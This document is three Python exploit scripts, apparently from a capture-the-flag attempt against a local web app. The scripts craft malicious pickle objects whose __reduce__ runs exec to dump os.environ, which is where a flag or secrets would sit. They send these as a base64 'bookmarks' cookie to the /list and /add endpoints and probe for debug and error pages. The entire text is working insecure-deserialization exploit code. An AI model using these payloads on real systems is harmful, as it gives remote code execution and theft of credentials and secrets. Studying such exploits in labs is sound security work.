import requests
import pickle
import base64

# First, let's explore what endpoints exist and try triggering with POST/form data

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}

# Create exec payload that writes to stderr or file
class PayloadStderr:
    def __reduce__(self):
        import sys
        code = "import sys, os; sys.stderr.write('ENV: ' + str(dict(os.environ)) + '\\n'); sys.stderr.flush()"
        return (__import__('builtins').exec, (code,))

# Try to cause unhandled exception using object.__setattr__ on immutable
class PayloadImmutable:
    def __reduce__(self):
        return (object.__setattr__, ('string', 'attr', 'value'))  # Try to set attr on string

# Using print to stdout (might appear in response)
class PayloadPrint:
    def __reduce__(self):
        code = "import os; print('FLAG_ENV:', dict(os.environ))"
        return (__import__('builtins').exec, (code,))

# Test with different HTTP methods and endpoints
print("[*] Testing various payload types and endpoints...")

payloads = [
    ("stderr", PayloadStderr()),
    ("immutable", PayloadImmutable()),
    ("print", PayloadPrint()),
]

# Test /list
for name, payload_obj in payloads:
    pickled = pickle.dumps(payload_obj, protocol=4)
    encoded = base64.b64encode(pickled).decode()
    
    cookies = {"bookmarks": encoded}
    
    # Try GET /list
    response = requests.get(f"{target_url}/list", cookies=cookies, 
                           headers=headers, timeout=10)
    print(f"\n[*] /list GET with {name} payload: Status {response.status_code}")
    if response.status_code != 200 or "FLAG" in response.text or "ENV" in response.text:
        print(f"[!] Interesting response!")
        print(response.text[:2000])

# Try POST /add
print("\n\n[*] Trying POST to /add endpoint...")

# Check if there's a way to trigger via form data
class PayloadForm:
    def __reduce__(self):
        code = "import os; raise RuntimeError('ENVIRON: ' + str(dict(os.environ)))"
        return (__import__('builtins').exec, (code,))

pickled = pickle.dumps(PayloadForm(), protocol=4)
encoded = base64.b64encode(pickled).decode()

cookies = {"bookmarks": encoded}

try:
    response = requests.post(
        f"{target_url}/add",
        cookies=cookies,
        headers=headers,
        data={"name": "test", "url": "http://example.com"},
        timeout=10,
        allow_redirects=True
    )
    print(f"[*] Status: {response.status_code}")
    print(f"[*] URL: {response.url}")
    if response.status_code == 500 or "FLAG" in response.text or "ENVIRON" in response.text:
        print(f"[!] Exploit triggered!")
        print(response.text[:2000])
except Exception as e:
    print(f"[*] Error: {e}")

import requests
import pickle
import base64

# The target seems to handle errors gracefully. Let me try a few more creative approaches.
target_url = "http://127.0.0.1:32962"

# Approach: Use a class with custom __getstate__/__setstate__ that executes during unpickling
class PayloadCustom:
    def __getstate__(self):
        return {"env": dict(__import__('os').environ)}
    
    def __setstate__(self, state):
        # This executes during unpickling
        import os
        env = state.get("env", {})
        # Force an actual error during unpickling
        raise Exception(f"UNPICKLE_ENV: {env}")

pickled = pickle.dumps(PayloadCustom(), protocol=4)
encoded = base64.b64encode(pickled).decode()

print(f"[*] Payload with __setstate__: {encoded}")

cookies = {"bookmarks": encoded}
headers = {"User-Agent": "Mozilla/5.0"}

try:
    response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=10)
    print(f"[*] Status: {response.status_code}")
    print(f"[*] Response text length: {len(response.text)}")
    
    # Check if there's a debug mode or error page
    if "Traceback" in response.text or "Error" in response.text or "Exception" in response.text:
        print(f"[!] ERROR PAGE FOUND!")
        print(response.text)
    else:
        print(f"[*] Normal response (no error page)")
except Exception as e:
    print(f"[*] Request error: {e}")

# Try to access error details via different approaches
# Maybe there's a /debug or error handler endpoint
print("\n\n[*] Checking for debug/error endpoints...")

endpoints = ["/", "/list", "/add", "/delete", "/about", "/error", "/debug"]
for endpoint in endpoints:
    try:
        resp = requests.get(f"{target_url}{endpoint}", timeout=5)
        print(f"[*] {endpoint}: {resp.status_code} ({len(resp.text)} bytes)")
    except Exception as e:
        print(f"[*] {endpoint}: Error - {e}")

import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"

# Create a payload that modifies the resulting object in a way that 
# causes an error when the code tries to use it

# Try making the pickle return a string that looks like environment data
class PayloadReturnString:
    def __reduce__(self):
        # Return a tuple format that creates a string with env data
        import os
        env_str = "ENV_DATA: " + str(dict(os.environ))
        return (str, (env_str,))

pickled = pickle.dumps(PayloadReturnString(), protocol=4)
encoded = base64.b64encode(pickled).decode()

print(f"[*] Payload: {encoded}")

cookies = {"bookmarks": encoded}
headers = {"User-Agent": "Mozilla/5.0"}

response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=10)
print(f"[*] Status: {response.status_code}")

# Check the response for any sign of our injected data
if "ENV_DATA" in response.text:
    print(f"[!] FOUND ENV_DATA IN RESPONSE!")
    print(response.text)
elif "No URLs added" not in response.text:
    print(f"[!] RESPONSE CHANGED!")
    print(response.text)
else:
    print(f"[*] Normal response")

# Let's also check what happens with a completely invalid pickle
print("\n\n[*] Testing invalid pickle data...")

cookies = {"bookmarks": "INVALID_PICKLE_DATA!!!"}
response = requests.get(f"{target_url}/list", cookies=cookies, headers=headers, timeout=10)
print(f"[*] Status with invalid data: {response.status_code}")
if response.status_code == 500:
    print(f"[!] 500 ERROR with invalid pickle!")
    print(response.text)

